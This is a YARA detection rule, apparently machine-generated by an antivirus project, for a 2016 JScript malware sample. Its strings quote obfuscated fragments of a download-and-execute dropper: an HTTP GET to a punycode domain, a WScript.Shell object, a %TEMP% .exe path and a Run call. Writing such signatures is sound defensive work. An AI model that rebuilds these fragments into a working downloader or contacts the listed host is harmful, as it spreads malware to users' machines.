rule sig_20160401_9f2809a21f55bbed0a8d0a246d2399c6 {
  meta:
    description = "datamaliciousorder - file 20160401_9f2809a21f55bbed0a8d0a246d2399c6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "26b2464a471b6203105600302f120272054ce08649c59341a55d02acd1ffbe3c"

  strings:
    $s1  = "TbrXji[QvuEzx](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "function BzMy(AgJt, XfBhm){UvMhd = UvMhd * 1; return AgJt - XfBhm;};" fullword ascii
    $s3  = "var FsmPjh = function IfoJw() {return WScript[HqfTwu](\"WScript\"+\".Shell\");}(), SeyHm = 11;" fullword ascii
    $s4  = "if (TbrXji[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function BslTb(){return HupDoo + \"\";};" fullword ascii
    $s6  = "function NnNbg() {return FsmPjh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"4ejMbg5vaWDN6C.ex\" + \"e\";};" fullword ascii
    $s7  = "function WtUf() {return ((VibSsx == true) && (VibSsx == WfHy)) ? 1 : UvMhd;};" fullword ascii
    $s8  = "function VcyMtt(PxyYzr){FsmPjh[\"R\"+\"un\"](PxyYzr, UvMhd, UvMhd);};" fullword ascii
    $s9  = "var WfHy = false;" fullword ascii
    $s10 = "function XkmZrb(){return 23;};" fullword ascii
    $s11 = "var VibSsx = false;" fullword ascii
    $s12 = "var FnvGko = new this[\"Date\"]();" fullword ascii
    $s13 = "function ZqOe()" fullword ascii
    $s14 = "var UoYi = false;" fullword ascii
    $s15 = "return BzMy(WxMh, YcrGjm);" fullword ascii
    $s16 = "WfHy = true; " fullword ascii
    $s17 = "}while (RseCna);" fullword ascii
    $s18 = "function LoPgj(YbpPcb) {var YhjNbf = (1, 2, 3, 4, 5, YbpPcb); return YhjNbf;};" fullword ascii
    $s19 = "function VbQbl(){return HqfTwu;};" fullword ascii
    $s20 = "VibSsx = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}